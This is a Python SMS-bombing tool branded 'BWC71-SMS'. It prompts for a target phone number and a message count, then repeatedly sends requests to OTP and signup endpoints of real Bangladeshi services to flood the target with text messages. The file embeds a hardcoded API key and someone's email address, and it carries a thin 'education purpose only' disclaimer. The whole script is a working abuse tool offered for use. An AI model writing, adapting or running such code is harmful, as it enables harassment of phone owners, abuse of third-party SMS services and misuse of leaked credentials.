import os
import requests
import time
from requests.structures import CaseInsensitiveDict

#CVALUE
blue= '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan  = "\033[96m"
end = '\033[0m'
line=yellow+"=============================================================================================="
space=" "
logo=red+str("""
┌──────────❀̥˚──◌─ - ────❀̥˚──────────┐

╭━━╮╭╮╭╮╭┳━━━┳━━━╮╭╮╱╭━━━┳━╮╭━┳━━━╮
┃╭╮┃┃┃┃┃┃┃╭━╮┃╭━╮┣╯┃╱┃╭━╮┃┃╰╯┃┃╭━╮┃
┃╰╯╰┫┃┃┃┃┃┃╱╰┻╯╭╯┣╮┃╱┃╰━━┫╭╮╭╮┃╰━━╮
┃╭━╮┃╰╯╰╯┃┃╱╭╮╱┃╭╯┃┃╱╰━━╮┃┃┃┃┃┣━━╮┃
┃╰━╯┣╮╭╮╭┫╰━╯┃╱┃┃╭╯╰╮┃╰━╯┃┃┃┃┃┃╰━╯┃
╰━━━╯╰╯╰╯╰━━━╯╱╰╯╰━━╯╰━━━┻╯╰╯╰┻━━━╯
            ❀̥˚──◌─ - ────❀̥˚
⚤𝔻𝔼𝕍𝔼𝕃𝕆ℙ𝕄𝔼ℕ𝕋: 𝕄𝔻 𝕊ℍ𝕀ℝ𝔸𝕁𝕌𝕃 𝕀𝕊𝕃𝔸𝕄(ℕ𝕠 ℕ𝕒𝕞𝕖 𝕍𝕚𝕣𝕦𝕤)⚤
Admin - Bangladesh White Cyber 71
            ❀̥˚──◌─ - ────❀̥˚
           ❀̥Facebook Profile❀̥
     https://facebook.com/no.name.virus
              ─────────  
           ❀̥Facebook Groups❀̥
     https://facebook.com/no.name.virus
              ─────────
           ❀̥Facebook Pages❀̥
     https://facebook.com/bwc71
              ─────────
               ❀̥Github❀̥	
     https://github.com/NoNameVirus
              ─────────
       ≛ Credit: Root Of Cyber≛
└───────────❀̥˚──◌─ - ────❀̥˚───────────┘                                                   
""")

      
 #HEADER                
text=cyan+"If You Need any help so please select option 2 to"+green+" contact With Me.   \n" 
notice=" Bangladesh White Cyber 71 - We Fought For Bangladesh"     
def header():
	print(logo)
	print(text)
	print(line)
	print(notice)
#SELECT_MAIN
def opt():
	print(green+"\n This tools only for education perpose only ")
	print(cyan+"==> Select Your Option From Below\n")
	print(yellow+"[1] Start BD SMS Bombing With BWC71 SMS\n\n [2] Contacts")
	

#MAIN_TOOL
os.system('clear')
tt=1
header()	
opt()
while tt<2:
	opt2=str(input(blue+"\n\n [>] Enter the number of option : "+yellow))
	if opt2=="1":
		text=cyan+"" 
		os.system('clear')
		header()
		number=str(input(blue+"\n\n [>] Enter Your Target Number : "+yellow))
		ammount=int(input(blue+"\n [>] Enter The Ammount Of SMS : "+yellow))
		os.system('clear')
		notice=cyan+"\n\t   [•] BWC71-SMS Tools in progress......\n\n"
		header()
		ammount2=1
		totalsent=0
		totalnotsent=0
		while ammount2<ammount+1:
			try:
				if "yyy" in number or "yyy" in number:
					r=requests.post("https://assetliteapi.banglalink.net/api/v1/user/otp-login/request",data={"mobile":number})
						
				else:
					url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"
					headers = CaseInsensitiveDict()
					headers["Host"] = "prod-api.viewlift.com"
					headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0"
					headers["Accept"] = "application/json, text/plain, */*"
					headers["Accept-Language"] = "en-US,en;q=0.5"
					headers["Accept-Encoding"] = "gzip, deflate, br"
					headers["Content-Type"] = "application/json"
					headers["Content-Length"] = "128"
					headers["x-api-key"] = "dtGKRIAd7y3mwmuXGk63u3MI3Azl1iYX8w9kaeg3"
					headers["Origin"] = "https://www.hoichoi.tv"
					headers["Referer"] = "https://www.hoichoi.tv/"
					headers["Connection"] = "keep-alive"
					data = """{\"requestType\":\"send\",\"phoneNumber\":\"+88"""+number+"""\",\"emailConsent\":true,\"whatsappConsent\":true,\"email\":\"sanaur.asif@gmail.com\"}"""
					r= requests.post(url, headers=headers, data=data)
												
				if ammount2==1:
					print(cyan+"\n\t  ★★BWC71-SMS★★==>   "+green+"[✓] 1st SMS Sent.")
				elif ammount2==2:
					print(cyan+"\n\t  ★★BWC71-SMS★★==>   "+green+"[✓] 2nd SMS Sent.")
				elif ammount2==3:
					print(cyan+"\n\t  ★★BWC71-SMS★★==>   "+green+"[✓] 3rd SMS Sent.")
				else:
					print(cyan+"\n\t  ★★BWC71-SMS★★==>   "+green+"[✓] "+str(ammount2)+"th SMS Sent.")
				time.sleep(1)
				totalsent+=1
				ammount2+=1
			except:
				if ammount2==1:
					print(cyan+"\n\t  ★★BWC71-SMS★★==>   "+red+"[×] 1st SMS Not Sent.")
				elif ammount2==2:
					print(cyan+"\n\t  ★★BWC71-SMS★★==>   "+red+"[×] 2nd SMS Not Sent.")
				elif ammount2==3:
					print(cyan+"\n\t  ★★BWC71-SMS★★==>   "+red+"[×] 3rd SMS Not Sent.")
				else:
					print(cyan+"\n\t  ★★BWC71-SMS★★==>   "+red+"[×] "+str(ammount2)+"th SMS Not Sent.")
					time.sleep(10)
					ammount2+=1
									
								
		totalhit=ammount2-1
		totalnotsent=totalhit-totalsent
		print(cyan+"\n\n\t\t[•] Total Hits : "+yellow+str(totalhit))
		print(green+"\n\t\t[✓] Total Sent : "+yellow+str(totalsent))
		print(red+"\n\t\t[×] Total Not Sent : "+yellow+str(totalnotsent)+"\n")
		lastt=str(input(cyan+"\n\n\t\t  [✓] All Done! Thanks for use BWC71\n\t [•] Now Press Enter Key To Continue\n"))
		os.system('clear')
		notice=""
		text=green+"\n\n\t\t★★★BWC71-SMS Tools★★★   \n" 
		header()
		opt()
